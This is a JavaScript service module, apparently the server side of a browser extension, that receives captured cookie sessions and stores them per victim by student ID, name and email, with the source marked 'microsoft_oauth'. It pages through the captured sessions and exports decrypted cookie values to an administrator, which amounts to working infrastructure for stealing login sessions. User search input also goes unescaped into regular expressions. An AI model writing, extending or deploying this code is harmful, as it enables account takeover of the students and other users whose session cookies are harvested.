/* Cookie service. Port of extention-server/services/cookieService.js,
 * with encryption at rest: cookie values are AES-256-GCM sealed before
 * they reach Mongo (see vault-crypto.js) — a DB dump alone yields no
 * usable sessions. Legacy plaintext rows still read fine and are
 * re-encrypted on their next save. */

import { CookieSession } from './models-cookies.js';
import {
  encryptCookieList,
  decryptCookieList,
} from './vault-crypto.js';

export async function saveCookieSession(payload) {
  const doc = {
    sessionId: payload.sessionId,
    studentId: payload.studentId || null,
    userName: payload.userName || 'unknown',
    userEmail: payload.userEmail || 'unknown',
    source: payload.source || 'microsoft_oauth',
    phase: payload.phase,
    triggerUrl: payload.triggerUrl,
    domains: payload.domains || [],
    // Encrypted at rest.
    cookies: encryptCookieList(payload.cookies),
    cookieCount: payload.cookies.length,
    userAgent: payload.userAgent || null,
    metadata: payload.metadata || {},
    capturedAt: new Date(),
  };

  const result = await CookieSession.findOneAndUpdate(
    { sessionId: payload.sessionId, phase: payload.phase },
    { $set: doc },
    { upsert: true, new: true, setDefaultsOnInsert: true },
  );

  return {
    sessionId: result.sessionId,
    phase: result.phase,
    cookieCount: result.cookieCount,
    capturedAt: result.capturedAt,
  };
}

export async function listCookieSessions(options) {
  const page = Math.max(1, Number(options.page) || 1);
  const limit = Math.min(100, Math.max(1, Number(options.limit) || 20));
  const skip = (page - 1) * limit;
  const filter = {};

  if (options.phase) filter.phase = options.phase;
  if (options.studentId) filter.studentId = new RegExp(options.studentId, 'i');
  if (options.userName) filter.userName = new RegExp(options.userName, 'i');
  if (options.userEmail) {
    filter.userEmail = new RegExp(options.userEmail, 'i');
  }
  if (options.dateFrom || options.dateTo) {
    filter.capturedAt = {};
    if (options.dateFrom) filter.capturedAt.$gte = new Date(options.dateFrom);
    if (options.dateTo) {
      const to = new Date(options.dateTo);
      to.setHours(23, 59, 59, 999);
      filter.capturedAt.$lte = to;
    }
  }

  const [items, total] = await Promise.all([
    CookieSession.find(filter)
      .sort({ capturedAt: -1 })
      .skip(skip)
      .limit(limit)
      .select('-cookies')
      .lean(),
    CookieSession.countDocuments(filter),
  ]);

  return { items, total, page, limit, pages: Math.ceil(total / limit) || 1 };
}

export async function getCookieSessionById(id) {
  return CookieSession.findById(id).lean();
}

export function buildCookieExport(session) {
  if (!session) return null;
  return {
    sessionId: session.sessionId,
    studentId: session.studentId,
    userName: session.userName || 'unknown',
    userEmail: session.userEmail || 'unknown',
    source: session.source,
    phase: session.phase,
    triggerUrl: session.triggerUrl,
    domains: session.domains,
    capturedAt: session.capturedAt,
    cookieCount: session.cookieCount,
    // Admin-only export: decrypt the at-rest values.
    cookies: decryptCookieList(session.cookies),
  };
}
